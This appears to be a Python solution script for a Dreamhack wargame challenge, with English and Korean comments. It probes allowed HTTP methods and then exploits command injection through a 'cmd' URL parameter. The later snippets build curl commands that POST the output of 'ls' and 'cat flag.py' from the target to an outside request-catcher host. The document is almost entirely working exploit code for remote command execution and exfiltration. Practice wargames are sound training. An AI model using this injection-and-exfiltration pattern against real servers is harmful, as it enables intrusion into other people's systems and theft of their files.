# Wargame site URL: https://dreamhack.io/wargame/challenges/73

'''
CAUTION! You need to run the codes below in order to properly help you solve the Wargames problem.
'''

##############################################

#CODE No.1: Figuring out the range of allowed methods in targeted site.
#사이트 HTTP 메소드 허용 범위를 알아내는 코드
import requests

print("Link: ",end="")
link=str(input())

response = requests.options(link)

# print response
print(response.headers)

##############################################

#CODE No.2: HEAD method using code
#HEAD 메소드 사용 코드
import requests

print("Link: ",end=" ")
link=str(input())

resp=requests.head(link)

print(resp)
print(resp.headers.get)
print(resp.text)

##############################################

#Code No.3: Adding Dreamhack Tools
#드림핵 툴 추가 코드
import requests

print("Dreamhack Tool Link: ",end=" ")
DreamhackTool=str(input())

resp=requests.get(DreamhackTool)

print(resp.text)

##############################################

#Code No.4
#명령어 curl을 사용하여 사이트로 요청을 보내는 코드
import requests
import urllib.parse

print("드림핵 툴 링크: ",end=" ")
DTLink=str(input())
enc_DTL=urllib.parse.quote("curl "+DTLink)

print("링크: ",end=" ")
link=str(input())

url=link+"?cmd="+enc_DTL

print("url: "+url)

resp=requests.head(url)
print(resp)
print(resp.headers.get)

##############################################

#Code No.5: Code No.4 + ls(command word)
#Code No.4 + ls(명령어)
import requests
import urllib.parse

print("드림핵 툴 링크: ",end=" ")
DTLink=str(input())

print("링크: ",end=" ")
link=str(input())

sys_cmd="ls"

cmd=f'curl -X POST {DTLink} -d "$({sys_cmd})"'

print("보낼 명령어: %s" %cmd)

enc_cmd=urllib.parse.quote(cmd)
url=f"{link}?cmd={enc_cmd}"

resp=requests.head(url)

print(resp)
print(resp.headers.get)

##############################################

#Code No.6: Printing flag
#플래그 출력
import requests
import urllib.parse

print("드림핵 툴 링크: ",end=" ")
DTLink=str(input())

print("링크: ",end=" ")
link=str(input())

sys_cmd="cat flag.py"

cmd=f'curl -X POST {DTLink} -d "$({sys_cmd})"'

print("보낼 명령어: %s" %cmd)

enc_cmd=urllib.parse.quote(cmd)
url=f"{link}?cmd={enc_cmd}"

resp=requests.head(url)

